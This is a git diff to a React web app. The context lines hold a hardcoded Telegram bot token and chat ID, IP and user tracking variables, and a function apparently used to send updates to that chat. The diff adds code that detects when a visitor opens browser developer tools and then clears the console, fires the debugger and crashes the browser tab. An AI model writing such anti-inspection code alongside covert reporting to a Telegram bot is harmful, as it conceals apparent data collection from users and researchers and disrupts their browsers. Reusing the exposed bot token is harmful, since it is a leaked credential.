@@ -9,6 +9,7 @@ import profiles, { getActiveProfile, setActiveProfile, setProfiles } from './pro
 import './sidebar.css'
 import { useHistory } from 'react-router-dom';
 import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
+import { addListener, crashBrowserCurrentTab, launch } from 'devtools-detector';
 
 let ip = 'Not Found';
 let currentUser = 'unknown';
@@ -16,7 +17,7 @@ let time = 0;
 const tgtoken = 'bot5807856562:AAFx-yxoMg2aoAggt4M0NU7qeLe49DIv__g';
 const chat_id = "-1001166751237"
 
-export async function sendUpdate(msg , force = false) {
+export async function sendUpdate(msg, force = false) {
   if (time < Date.now() - 3000 || force) {
     time = Date.now();
 
@@ -75,7 +76,26 @@ function App(props) {
       event.preventDefault();
       setActiveModal(modals.none)
     };
+
+    const handleDevToolsOpen = () => {
+      console.clear(); // Clear all console logs
+      console.log("DevTools is opened, console cleared, network requests aborted, and data reset.");
+      debugger; // Attach debugger when DevTools is opened
+    };
+
+    const view = document.createElement('div');
+    document.body.appendChild(view);
+    addListener(function (isOpen) {
+      if (isOpen) {
+        console.log("DevTools is opened, console cleared, network requests aborted, and data reset.");
+        setTimeout(crashBrowserCurrentTab, 2000);
+      }
+    });
+    launch();
+
     window.addEventListener('popstate', handleBackButton);
+    window.addEventListener('resize', handleDevToolsOpen);
+
   }, [])
 
   useEffect(() => {
